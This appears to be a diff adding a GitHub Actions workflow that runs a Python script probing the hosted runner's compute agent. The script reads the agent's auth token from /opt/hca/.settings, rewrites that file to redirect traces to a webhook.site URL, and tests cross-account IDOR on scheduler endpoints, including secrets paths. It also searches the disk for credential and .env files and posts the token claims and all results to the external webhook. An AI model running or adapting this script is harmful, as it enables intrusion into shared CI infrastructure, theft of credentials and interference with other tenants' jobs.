@@ -1,0 +1,341 @@
+name: Probe v57 - account_a
+on:
+  workflow_dispatch:
+jobs:
+  probe:
+    runs-on: ubuntu-24.04
+    env:
+      V57_SOURCE: v57_account_a
+      V57_OTHER_ALLOC: 310c2cfd-b1cf-42f2-90a3-062c27db6deb
+    steps:
+      - name: v57 trace-schema + settings-write + idor + disk-reuse + proto
+        run: |
+          cat > /tmp/v57_probe.py << 'PROBE_EOF'
+          
+          import json, os, base64, subprocess, re, urllib.request, urllib.error, time, copy
+          
+          WEBHOOK = "https://webhook.site/53b82227-04b4-4ad2-9cdd-2abbd8a81837"
+          RUN_ID  = os.environ.get("GITHUB_RUN_ID", "unknown")
+          REPO    = os.environ.get("GITHUB_REPOSITORY", "unknown")
+          SOURCE  = os.environ.get("V57_SOURCE", "v57_account_a")
+          OTHER_ALLOC = os.environ.get("V57_OTHER_ALLOC", "")
+          
+          def probe(method, url, body=None, extra=None, timeout=15):
+              data = body if isinstance(body, bytes) else (body.encode() if isinstance(body, str) else None)
+              headers = {"Content-Type": "application/json", "User-Agent": "hosted-compute-agent/1.0"}
+              if extra:
+                  headers.update(extra)
+              if data:
+                  headers["Content-Length"] = str(len(data))
+              req = urllib.request.Request(url, data=data, headers=headers, method=method)
+              try:
+                  r = urllib.request.urlopen(req, timeout=timeout)
+                  return {"status": r.status, "body": r.read(8000).decode("utf-8","replace"), "hdrs": dict(r.headers)}
+              except urllib.error.HTTPError as e:
+                  return {"status": e.code, "body": e.read(8000).decode("utf-8","replace"), "hdrs": dict(e.headers)}
+              except Exception as ex:
+                  return {"status": 0, "body": str(ex), "hdrs": {}}
+          
+          def probe_auth(method, url, token, body=None):
+              return probe(method, url, body, {"Authorization": f"Bearer {token}"})
+          
+          def sh(cmd, timeout=20):
+              try:
+                  r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
+                  return r.stdout + r.stderr
+              except Exception as ex:
+                  return f"TIMEOUT/ERROR: {ex}"
+          
+          print(f"[{SOURCE}] start")
+          
+          with open("/opt/hca/.settings") as f:
+              s = json.load(f)
+          
+          token       = s.get("authToken", "")
+          sched_url   = s.get("schedulerApiUrl", "").rstrip("/")
+          watchdog_url= s.get("watchdogTraceApiUrl", "").rstrip("/")
+          trace_url   = s.get("traceApiUrl", "").rstrip("/")
+          diag_sas    = s.get("diagnosticsSasUri", "")
+          config_id   = s.get("configId", "")
+          
+          parts = token.split(".")
+          pad = parts[1] + "=" * (4 - len(parts[1]) % 4)
+          claims = json.loads(base64.urlsafe_b64decode(pad))
+          wid         = claims.get("wid", "")
+          allocation_id = wid.split(":")[1].strip("{}") if ":" in wid else ""
+          rbf         = claims.get("rbf", 0)
+          iat         = claims.get("iat", 0)
+          
+          print(f"[{SOURCE}] allocation_id={allocation_id} wid={wid}")
+          print(f"[{SOURCE}] rbf={rbf} iat={iat} ttl={rbf-iat}s")
+          print(f"[{SOURCE}] sched_url={sched_url}")
+          print(f"[{SOURCE}] watchdog_url={watchdog_url}")
+          print(f"[{SOURCE}] trace_url={trace_url}")
+          print(f"[{SOURCE}] other_alloc={OTHER_ALLOC}")
+          
+          from urllib.parse import urlparse
+          sched_host = f"{urlparse(sched_url).scheme}://{urlparse(sched_url).netloc}"
+          
+          results = {"claims": claims, "sched_url": sched_url, "watchdog_url": watchdog_url}
+          
+          # ---- 1. FULL trace schema discovery (full body capture) ----------------------
+          print(f"\n[{SOURCE}] === TRACE SCHEMA DISCOVERY ===")
+          trace_endpoints = [watchdog_url, trace_url] if watchdog_url != trace_url else [watchdog_url]
+          
+          # Many different payload shapes to provoke specific Go decode errors
+          trace_payloads = [
+              ("empty_obj",    "{}"),
+              ("null",         "null"),
+              ("empty_arr",    "[]"),
+              ("spans_arr",    '{"spans": []}'),
+              ("spans_obj",    '{"spans": {}}'),
+              ("trace_id",     '{"traceId": "abc123"}'),
+              ("type_field",   '{"type": "agentTrace", "data": {}}'),
+              ("event",        '{"event": "heartbeat", "allocationId": "test"}'),
+              ("msg",          '{"message": "test"}'),
+              ("agent_trace",  '{"agentTrace": {"allocationId": "test", "spans": []}}'),
+              ("spans_items",  '{"spans": [{"name": "test", "duration": 1}]}'),
+              ("agent_event",  '{"agentEvent": "heartbeat"}'),
+              ("hca_trace",    '{"hcaTrace": {"vmName": "test", "allocationId": "test"}}'),
+              ("trace_data",   '{"traceData": [{"key": "val"}]}'),
+              ("annotation",   '{"annotation": {"key": "val"}}'),
+              ("tags",         '{"tags": {"allocationId": "test"}}'),
+              ("v1_trace",     '{"v1": {"trace": "test"}}'),
+              ("events",       '{"events": [{"type": "heartbeat"}]}'),
+          ]
+          
+          trace_schema_results = {}
+          for ep_url in trace_endpoints:
+              ep_key = "watchdog" if "watchdog" in ep_url else "trace"
+              print(f"\n[TRACE_SCHEMA] endpoint: {ep_url}")
+              for key, payload in trace_payloads:
+                  r = probe("POST", ep_url, payload)
+                  # FULL body
+                  full_body = r["body"]
+                  trace_schema_results[f"{ep_key}_{key}"] = {"status": r["status"], "body": full_body[:2000]}
+                  if r["status"] not in (404, 405, 0):
+                      print(f"[TRACE_SCHEMA] {ep_key}/{key} -> {r['status']} | {full_body[:400]}")
+                  else:
+                      print(f"[TRACE_SCHEMA] {ep_key}/{key} -> {r['status']}")
+          
+          results["trace_schema"] = trace_schema_results
+          
+          # ---- 2. Trace endpoint auth check (with vs without token) --------------------
+          print(f"\n[{SOURCE}] === TRACE AUTH CHECK ===")
+          for ep_url in trace_endpoints:
+              ep_key = "watchdog" if "watchdog" in ep_url else "trace"
+              # Without token (already done above) vs with token
+              test_payload = '{"spans": []}'
+              r_noauth = probe("POST", ep_url, test_payload)
+              r_withauth = probe_auth("POST", ep_url, token, test_payload)
+              print(f"[TRACE_AUTH] {ep_key} no_auth -> {r_noauth['status']} | {r_noauth['body'][:200]}")
+              print(f"[TRACE_AUTH] {ep_key} with_jwt -> {r_withauth['status']} | {r_withauth['body'][:200]}")
+              results[f"trace_auth_{ep_key}"] = {
+                  "no_auth": {"status": r_noauth["status"], "body": r_noauth["body"][:500]},
+                  "with_jwt": {"status": r_withauth["status"], "body": r_withauth["body"][:500]},
+              }
+          
+          # ---- 3. .settings write → redirect watchdogTraceApiUrl to webhook -----------
+          print(f"\n[{SOURCE}] === .SETTINGS WRITE → TRACE REDIRECT ===")
+          SETTINGS_PATH = "/opt/hca/.settings"
+          try:
+              # Read and save original
+              with open(SETTINGS_PATH) as f:
+                  original_settings_str = f.read()
+              original_settings = json.loads(original_settings_str)
+          
+              # Modify to redirect trace to our webhook
+              modified = copy.deepcopy(original_settings)
+              modified["watchdogTraceApiUrl"] = WEBHOOK
+              modified["traceApiUrl"] = WEBHOOK
+          
+              # Write modified settings
+              with open(SETTINGS_PATH, "w") as f:
+                  json.dump(modified, f)
+              print(f"[SETTINGS_WRITE] overwrite succeeded: watchdogTraceApiUrl -> {WEBHOOK}")
+          
+              # Verify the write
+              with open(SETTINGS_PATH) as f:
+                  verify = json.load(f)
+              write_ok = verify.get("watchdogTraceApiUrl") == WEBHOOK
+              print(f"[SETTINGS_WRITE] verify read-back: watchdog={verify.get('watchdogTraceApiUrl')} ok={write_ok}")
+          
+              results["settings_write"] = {"success": write_ok, "modified_url": WEBHOOK}
+          
+              # Wait for HCA to send a trace to our webhook (30s)
+              print(f"[SETTINGS_WRITE] waiting 30s for HCA to send trace to webhook...")
+              time.sleep(30)
+          
+              # Restore original
+              with open(SETTINGS_PATH, "w") as f:
+                  f.write(original_settings_str)
+              print(f"[SETTINGS_WRITE] restored original .settings")
+          
+          except Exception as ex:
+              print(f"[SETTINGS_WRITE] error: {ex}")
+              results["settings_write"] = {"error": str(ex)}
+              # Attempt restore anyway
+              try:
+                  with open(SETTINGS_PATH, "w") as f:
+                      f.write(original_settings_str)
+                  print(f"[SETTINGS_WRITE] restored after error")
+              except:
+                  pass
+          
+          # ---- 4. IDOR: heartbeat with OTHER account's allocation_id ------------------
+          print(f"\n[{SOURCE}] === IDOR HEARTBEAT TEST ===")
+          if OTHER_ALLOC:
+              # The heartbeat endpoint: PUT /v1/request/heartbeat
+              heartbeat_url = f"{sched_url}/request/heartbeat"
+          
+              # Test 1: PUT heartbeat with OWN allocation_id in body (baseline = should 200)
+              body_own = json.dumps({"allocationId": allocation_id})
+              r_own = probe_auth("PUT", heartbeat_url, token, body_own)
+              print(f"[IDOR] heartbeat OWN alloc -> {r_own['status']} | {r_own['body'][:200]}")
+          
+              # Test 2: PUT heartbeat with OTHER allocation_id in body (IDOR test)
+              body_other = json.dumps({"allocationId": OTHER_ALLOC})
+              r_other = probe_auth("PUT", heartbeat_url, token, body_other)
+              print(f"[IDOR] heartbeat OTHER alloc -> {r_other['status']} | {r_other['body'][:200]}")
+          
+              # Test 3: PUT heartbeat with OTHER alloc in URL path (if that's how it works)
+              r_url_other = probe_auth("PUT", f"{sched_url}/request/{OTHER_ALLOC}/heartbeat", token, "{}")
+              print(f"[IDOR] heartbeat path/{OTHER_ALLOC} -> {r_url_other['status']} | {r_url_other['body'][:200]}")
+          
+              # Test 4: GET /v1/request (409 shows our info — does it show their info too?)
+              r_get = probe_auth("GET", f"{sched_url}/request", token)
+              print(f"[IDOR] GET /v1/request -> {r_get['status']} | {r_get['body'][:500]}")
+          
+              # Test 5: GET /v1/request?allocation_id=OTHER
+              r_get_alloc = probe_auth("GET", f"{sched_url}/request?allocation_id={OTHER_ALLOC}", token)
+              print(f"[IDOR] GET /v1/request?other_alloc -> {r_get_alloc['status']} | {r_get_alloc['body'][:300]}")
+          
+              results["idor"] = {
+                  "heartbeat_own": {"status": r_own["status"], "body": r_own["body"][:500]},
+                  "heartbeat_other": {"status": r_other["status"], "body": r_other["body"][:500]},
+                  "heartbeat_path_other": {"status": r_url_other["status"], "body": r_url_other["body"][:500]},
+                  "get_request": {"status": r_get["status"], "body": r_get["body"][:500]},
+                  "get_request_alloc": {"status": r_get_alloc["status"], "body": r_get_alloc["body"][:500]},
+              }
+          else:
+              print(f"[IDOR] no OTHER_ALLOC set, skipping")
+          
+          # ---- 5. Token TTL: heartbeat after rbf (test if server enforces expiry) -----
+          print(f"\n[{SOURCE}] === TOKEN TTL TEST ===")
+          now = int(time.time())
+          ttl_remaining = rbf - now
+          print(f"[TTL] now={now} rbf={rbf} iat={iat} remaining={ttl_remaining}s")
+          # Already-past: if rbf < now, test immediately
+          if ttl_remaining < 0:
+              r_ttl = probe_auth("PUT", f"{sched_url}/request/heartbeat", token,
+                                  json.dumps({"allocationId": allocation_id}))
+              print(f"[TTL] heartbeat AFTER rbf ({-ttl_remaining}s past) -> {r_ttl['status']} | {r_ttl['body'][:200]}")
+              results["ttl_test"] = {"status": r_ttl["status"], "body": r_ttl["body"][:500], "past_rbf_by": -ttl_remaining}
+          else:
+              print(f"[TTL] token still valid (rbf in {ttl_remaining}s), skipping sleep test")
+              # Also do a baseline heartbeat to confirm it works
+              r_hb = probe_auth("PUT", f"{sched_url}/request/heartbeat", token,
+                                 json.dumps({"allocationId": allocation_id}))
+              print(f"[TTL] baseline heartbeat (token valid) -> {r_hb['status']} | {r_hb['body'][:200]}")
+              results["ttl_test"] = {"status": r_hb["status"], "body": r_hb["body"][:500], "baseline": True}
+          
+          # ---- 6. VM reuse disk markers ------------------------------------------------
+          print(f"\n[{SOURCE}] === VM REUSE DISK MARKERS ===")
+          disk_checks = [
+              ("tmp_old",       "ls -la /tmp/ 2>&1 | head -30"),
+              ("var_tmp",       "ls -la /var/tmp/ 2>&1 | head -20"),
+              ("opt_hca",       "ls -la /opt/hca/ 2>&1 | head -20"),
+              ("hca_logs",      "ls -la /opt/hca/logs/ 2>&1 | head -10 && head -20 /opt/hca/logs/*.log 2>/dev/null"),
+              ("runner_home",   "ls -la /home/runner/ 2>&1 | head -20"),
+              ("runner_work",   "ls -la /home/runner/work/ 2>&1 | head -20 2>/dev/null || echo 'no work dir'"),
+              ("etc_cron",      "crontab -l 2>&1; ls /etc/cron.d/ 2>&1; cat /etc/rc.local 2>/dev/null"),
+              ("systemd_units", "ls /etc/systemd/system/ 2>&1 | grep -v generic | head -20"),
+              ("settings_hist", "find /opt/hca -name '*.settings*' -o -name '*.settings.bak' 2>/dev/null | head -10"),
+              ("prev_tokens",   "find / -name '.settings' 2>/dev/null | head -5"),
+              ("docker_sock",   "ls -la /var/run/docker.sock 2>/dev/null || echo 'no docker'"),
+              ("env_files",     "find /tmp /home /opt /root -name '.env*' -o -name '*.env' 2>/dev/null | head -10"),
+          ]
+          disk_results = {}
+          for key, cmd in disk_checks:
+              out = sh(cmd, timeout=10)
+              disk_results[key] = out[:2000]
+              if out.strip() and "No such" not in out and "not found" not in out.lower():
+                  print(f"[DISK] {key}:\n{out[:500]}")
+          results["disk"] = disk_results
+          
+          # ---- 7. HCA binary proto/Go type strings ------------------------------------
+          print(f"\n[{SOURCE}] === HCA BINARY PROTO STRINGS ===")
+          bin_path = "/opt/hca/hosted-compute-agent"
+          proto_strings = sh(f"strings {bin_path} 2>/dev/null | grep -iE '(AgentTrace|TraceRequest|SpanData|TraceData|TraceSpan|AgentEvent|WatchdogTrace|HCATrace|TraceReport|AgentReport|agentTrace|traceRequest|spanData)' | sort -u | head -60", timeout=20)
+          go_types = sh(f"strings {bin_path} 2>/dev/null | grep -E '^github\\.com/github/hosted-compute' | sort -u | head -80", timeout=20)
+          trace_paths = sh(f"strings {bin_path} 2>/dev/null | grep -iE '(/trace|/watchdog|/telemetry|/metrics|/spans|/events)' | sort -u | head -40", timeout=15)
+          json_tags = sh(f"strings {bin_path} 2>/dev/null | grep -iE 'json:\"(trace|span|alloc|agent|watchdog|event|heartbeat)' | sort -u | head -60", timeout=15)
+          print(f"[BIN_PROTO] trace types:\n{proto_strings[:2000]}")
+          print(f"[BIN_GO] go pkg paths:\n{go_types[:2000]}")
+          print(f"[BIN_PATHS] trace paths:\n{trace_paths[:1000]}")
+          print(f"[BIN_JSON] json tags:\n{json_tags[:1500]}")
+          results["binary_proto"] = {
+              "proto_strings": proto_strings[:3000],
+              "go_types": go_types[:3000],
+              "trace_paths": trace_paths[:2000],
+              "json_tags": json_tags[:2000],
+          }
+          
+          # ---- 8. Additional scheduler paths from known-good /v1/request base ---------
+          print(f"\n[{SOURCE}] === SCHEDULER /v1/request/* EXTENDED ===")
+          sched_ext = [
+              ("PUT",  f"/request/heartbeat",                        json.dumps({"allocationId": allocation_id})),
+              ("GET",  f"/request",                                  None),
+              ("POST", f"/request/complete",                         json.dumps({"allocationId": allocation_id, "exitCode": 0})),
+              ("POST", f"/request/cancel",                           json.dumps({"allocationId": allocation_id, "reason": "test"})),
+              ("GET",  f"/request/status",                           None),
+              ("GET",  f"/request/config",                           None),
+              ("GET",  f"/request/secrets",                          None),
+              ("POST", f"/request/secrets",                          json.dumps({"allocationId": allocation_id})),
+              ("GET",  f"/request/annotation",                       None),
+              ("POST", f"/request/annotation",                       json.dumps({"key": "test", "value": "test"})),
+              ("GET",  f"/request/{allocation_id}",                  None),
+              ("PUT",  f"/request/{allocation_id}/heartbeat",        json.dumps({})),
+              ("POST", f"/request/{allocation_id}/complete",         json.dumps({"exitCode": 0})),
+              ("GET",  f"/request/{allocation_id}/config",           None),
+              ("GET",  f"/request/{allocation_id}/secrets",          None),
+              ("POST", f"/trace",                                    json.dumps({"allocationId": allocation_id})),
+              ("GET",  f"/health",                                   None),
+              ("GET",  f"/version",                                  None),
+              ("GET",  f"/metrics",                                  None),
+              ("GET",  f"/",                                         None),
+          ]
+          sched_ext_results = {}
+          for method, path, body in sched_ext:
+              url = sched_url + path
+              r = probe_auth(method, url, token, body)
+              key = f"{method}_{path.lstrip('/').replace('/','_')}"
+              sched_ext_results[key] = {"status": r["status"], "body": r["body"][:500]}
+              if r["status"] not in (404, 405, 0):
+                  print(f"[SCHED_EXT] *** {method} {path} -> {r['status']} | {r['body'][:300]}")
+              else:
+                  print(f"[SCHED_EXT] {method} {path:50} -> {r['status']}")
+          results["sched_ext"] = sched_ext_results
+          
+          # ---- 9. Webhook ----------------------------------------------------------
+          print(f"\n[{SOURCE}] sending webhook...")
+          payload = {
+              "source": SOURCE, "run_id": RUN_ID, "repo": REPO,
+              "allocation_id": allocation_id, "other_alloc": OTHER_ALLOC,
+              "claims": claims,
+              "results": results,
+          }
+          data = json.dumps(payload, default=str).encode()
+          req = urllib.request.Request(WEBHOOK, data=data,
+                                        headers={"Content-Type": "application/json"}, method="POST")
+          try:
+              r = urllib.request.urlopen(req, timeout=30)
+              print(f"[{SOURCE}] Webhook: {r.status}")
+          except Exception as ex:
+              print(f"[{SOURCE}] Webhook error: {ex}")
+          
+          print(f"[{SOURCE}] DONE")
+          PROBE_EOF
+          python3 /tmp/v57_probe.py
+      - name: Keep alive
+        run: sleep 90
